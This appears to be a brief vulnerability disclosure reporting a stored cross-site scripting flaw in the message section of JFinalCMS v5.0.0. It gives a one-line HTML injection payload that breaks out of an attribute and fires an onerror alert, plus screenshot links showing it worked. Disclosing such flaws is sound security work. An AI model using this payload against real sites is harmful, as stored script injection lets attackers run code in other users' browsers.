target:https://gitee.com/heyewei/JFinalcms

version:v5.0.0

There is a storage type XSS in the message section

![1702990935921](https://github.com/Dempsey-l/cms/assets/76834303/e64eb044-a300-4473-a027-f4b9016f32f5)

poc:

```
"><img src=1 onerror=alert(1)>
```

![1702991034491](https://github.com/Dempsey-l/cms/assets/76834303/e3181119-690e-48f1-802f-78cd4f5db2dd)

successed

![1702991082661](https://github.com/Dempsey-l/cms/assets/76834303/fb5cd2f9-65f6-4ee7-ab6d-b9530cbe899a)
